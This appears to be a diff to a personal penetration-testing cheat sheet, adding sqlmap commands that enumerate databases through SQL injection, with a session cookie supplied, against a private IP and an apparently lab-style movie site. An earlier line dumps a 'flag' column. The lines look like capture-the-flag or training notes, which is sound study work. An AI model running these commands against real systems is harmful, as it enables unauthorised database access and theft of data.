@@ -45,6 +45,10 @@ Difference between
 #sqlmap -r req.txt -D blood -T flag -C name --dump
 _____________________________________________________________________________________________________________________________________________________________________________________
 
+Enumerating with cookies
+-------------------------
+#sqlmap -u "http://10.3.4.55/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-dbs
+#sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" 
 
 
 
